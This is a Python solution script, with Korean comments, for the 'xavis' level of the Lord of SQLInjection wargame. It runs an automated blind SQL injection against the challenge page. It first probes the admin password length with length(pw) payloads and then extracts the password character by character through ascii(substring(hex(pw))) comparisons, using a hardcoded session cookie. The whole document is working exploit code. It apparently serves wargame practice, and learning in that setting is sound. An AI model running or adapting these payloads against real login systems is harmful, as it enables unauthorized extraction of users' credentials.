# LOS
# STEP 19  xavis


import requests

url ="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?" #공격URL
cookies ={"PHPSESSID": "rn5jr60ecc1haund5ieu0dljnf"} #쿠키값

#패스워드 길이 찾기
def pw_len():
    len_num = 0

    while 1 :
        len_num = len_num + 1
        value = "' or id= 'admin' and length(pw)={} #".format(len_num) #injection payload
        parmas = {'pw': value}      #url에 GET으로 전달하는 파라미터
        response = requests.get(url,params=parmas, cookies=cookies)
        print(len_num)


        if "Hello admin" in response.text:    #응답값에 Hello admin이 있으면 반환
            #print (response.text)
            print("password length : ", len_num)
            break
    return len_num


#패스워드 한글자씩 찾기
def pw_real(len_num):
    pw=''
    #for i in range(1,len_num+1):
     #   print(i,"번째 검색 중")

    for i in range(1,len_num+1):
        for j in range(48, 122):  #아스키코드값 48번부터 122번
            value = "' or id= 'admin' and ascii(substring(hex(pw),{},1))={}#".format(i,j)           #injection payload 
            print (value)
            parmas = {'pw':value}
            response = requests.get(url, params=parmas, cookies=cookies)
            #print (j)
                        

            if "Hello admin" in response.text:       #응답값에 Hello admin이 있으면 반환
                pw = pw + chr(j)    #chr(): 아스키코드값 -> 문자
                print("password  : ", pw)
                break
    return pw


#Main

pw_real(pw_len())
